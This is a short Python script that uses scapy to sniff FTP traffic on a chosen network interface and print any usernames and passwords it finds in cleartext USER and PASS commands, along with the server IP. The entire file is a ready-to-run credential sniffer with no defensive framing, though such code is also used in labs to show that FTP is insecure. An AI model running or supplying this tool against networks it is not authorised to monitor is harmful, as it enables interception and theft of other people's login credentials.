from scapy.all import *
import argparse

parse = argparse.ArgumentParser()
parse.add_argument('-i', '--interface', help='network interface')
parse = parse.parse_args()


def sniffer_ftp(pkt):
    if pkt[TCP].dport == 21:
        data = pkt.sprintf("%Raw.load%")
        if "USER" in data:
            print("FTP IP: {} ".format(pkt[IP].dst))
            data = data.split(' ')
            data = data[1]
            print("[+] POSSIBLE FTP USER: " + data)
        elif "PASS" in data:
            data = data.split(' ')
            data = data[1]
            print("[+] PASSWORD: " + data)


def main():
    if parse.interface:
        print('Sniffing: ')
        sniff(iface=parse.interface, filter="tcp and port 21", prn=sniffer_ftp)
    else:
        print('Especify network interface')

if __name__ == "__main__":
    main()